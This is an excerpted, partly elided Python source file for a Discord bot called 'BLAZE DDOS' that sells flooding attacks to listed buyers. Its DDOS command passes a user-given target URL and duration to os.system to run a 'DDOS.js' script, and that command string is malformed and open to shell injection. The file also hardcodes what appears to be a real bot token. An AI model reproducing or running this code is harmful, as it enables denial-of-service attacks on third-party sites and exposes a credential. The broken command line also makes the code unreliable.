...
import threading
import psutil
token = "MTA5MjY1NzQ2NzczOTA5OTE5Ng.GEfZL9.eKbkKgjMuqxay-nMwoWga5Vou8Zpwmmd9Z32WE"
buyers = [974338108294316052 , 1085870274697768980]
admins = [1093855451545862176]
ownerList = [1093855018051977297]
...
async def on_connect():
    ...
    time.sleep(1.0)
    print("Success, Bot Is Online !!!! Owner:DiozYzz#3514")
...
async def help(ctx):
	if ctx.author.id not in buyers:
		embeds = discord.Embed(title="🚀 **BLAZE DDOS** 🚀", color=0xfcb103)
		embeds.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embeds.set_footer(text=f"© Owner : DiozYzz#3514 | {ctx.author.name}")
		
		
		await ctx.reply(embed=embeds)
	else:
		embed = discord.Embed(title="🚀 **BLAZE DDOS** 🚀", description="✨ **HELP MENU ✨", color=discord.Colour.random())
		embed.set_author(name="BLAZE DDoS Bot V1", icon_url="https://media2.giphy.com/media/F2U5dFf4LG1zYmnJS2/giphy.gif")
		...
		embed.set_footer(text=f"© Owner : DiozYzz#3514 | Requests By {ctx.author.name}")
...
async def Userinfo(ctx, user:discord.Member=None):
	...
	embed.set_footer(text=f"© Owner : DiozYzz#3514 | Info User : {user}", icon_url=ctx.author.avatar)
...
async def vpsinfo(ctx):
	...
	embed.set_author(name="Vps Info - BLAZE DDOS")
	...
	embed.set_footer(text="© Owner : DiozYzz#3514 | Info Bot : 🚀 BLAZE DDOS 🚀", icon_url=ctx.author.avatar)
...
async def Botinfo(ctx):
	embed = discord.Embed(color=0x03ff28)
	embed.set_thumbnail(url="https://i.pinimg.com/originals/8f/f2/10/8ff210a59c7a8eadc434ec303f7a86f5.jpg")
	embed.set_author(name="Bot Info - BLAZE DDOS")
	embed.add_field(name="ID :", value="1015483556501409792")
	embed.add_field(name="Name :", value="BLAZE DDOS")
	embed.add_field(name="Bot Owner :", value="DiozYzz#3514")
...
async def Methods(ctx):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **BLAZE DDOS** 🚀", color=0xfcb103)
...
async def Commands(ctx):
	if ctx.author.id not in buyers:
		...
		embed.add_field(name="**DDOS**", value="```!DDOS http://[ip] 80 [time]```")
		...
		embed.set_footer(text="© Owner : DiozYzz#3514 | All Methods Command", icon_url=ctx.author.avatar)
...
async def DDOS(ctx, url, time):
	if ctx.author.id not in buyers:
		...
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`DDOS`")
		embed.add_field(name="**Port**", value="`80`")
		embed.add_field(name="**Duration**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		...
		os.system(f"node DDOS.js (http:// +{url} 80 {time}")
...
async def KATA(ctx, url, mthd):
	if ctx.author.id not in buyers:
		...
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`BLAZE-DDOS`")
		embed.add_field(name="**Duration**", value=f"`Unknowns`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : DiozYzz#3514 | {ctx.author.name}", icon_url=ctx.author.avatar)
